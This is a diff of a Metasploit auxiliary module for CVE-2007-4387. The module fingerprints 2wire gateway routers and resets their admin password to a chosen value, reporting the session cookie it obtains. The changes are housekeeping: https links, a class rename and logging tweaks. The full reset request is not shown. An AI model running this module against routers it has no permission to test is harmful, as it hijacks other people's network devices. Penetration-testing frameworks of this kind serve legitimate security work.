@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info={})
@@ -28,14 +25,18 @@ class Metasploit3 < Msf::Auxiliary
           [ 'CVE', '2007-4387' ],
           [ 'OSVDB', '37667' ],
           [ 'BID', '36075' ],
-          [ 'URL', 'http://seclists.org/bugtraq/2007/Aug/225' ],
+          [ 'URL', 'https://seclists.org/bugtraq/2007/Aug/225' ],
         ],
       'DisclosureDate' => "Aug 15 2007" ))
 
       register_options(
         [
           OptString.new('PASSWORD', [ true, 'The password to reset to', 'admin'])
-        ], self.class)
+        ])
+  end
+
+  def post_auth?
+    false
   end
 
   def run
@@ -52,7 +53,7 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    #check to see if we get HTTP OK
+    # check to see if we get HTTP OK
     if (res.code == 200)
       print_status("Okay, Got an HTTP 200 (okay) code. Verifying Server header")
     else
@@ -60,7 +61,7 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    #Check to verify server reported is a 2wire router
+    # Check to verify server reported is a 2wire router
     if (res.headers['Server'].match(/2wire Gateway/i))
       print_status("Server is a 2wire Gateway! Grabbing info\n")
     else
@@ -88,7 +89,7 @@ class Metasploit3 < Msf::Auxiliary
       print_status("Hardware Version: #{hardware}")
     end
 
-    #Check the Software Version
+    # Check the Software Version
     if res.body.match(/<td class="data">(5\.\d{1,3}\.\d{1,3}\.\d{1,3})<\/td>/i)
       ver = $1
       print_status("Software version: #{ver}")
@@ -133,11 +134,10 @@ class Metasploit3 < Msf::Auxiliary
         cookies = res.get_cookies
         if cookies && cookies.match(/(.*); path=\//)
           cookie= $1
-          print_status("Got cookie #{cookie}. Password reset was successful!\n")
+          print_good("Got cookie #{cookie}. Password reset was successful!\n")
         end
       end
     end
 
   end
-
 end
